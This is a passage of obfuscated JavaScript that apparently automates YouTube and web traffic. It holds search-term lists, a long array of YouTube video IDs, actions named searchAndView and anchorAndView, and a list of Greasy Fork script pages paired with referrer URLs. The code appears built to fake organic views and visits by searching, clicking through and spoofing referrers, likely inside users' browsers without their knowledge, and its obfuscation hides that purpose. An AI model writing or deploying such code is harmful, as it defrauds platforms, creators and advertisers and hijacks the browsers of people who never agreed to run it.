'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1d37 + 0x1 * 0x8a5 + -0x149c * -0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x8a * 0xa + 0x9 * -0x211 + 0x1807)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + W(0xa, '3xyb') + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1 * 0x20b + 0x9ff + -0x7f1);

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x53 + 0x8c5 + 0x48c * -0x2);
    let h = e[f];
    return h;
  }, d(b, c);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    V(0x5) + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    W(0x1, 'P&%E') + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    W(0x10, 'Ms2G') + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    V(0x15) + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x0) + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': U(0x13) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x19) + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + U(0xd) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': U(0x13) + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + V(0x17) + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + U(0x7) + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
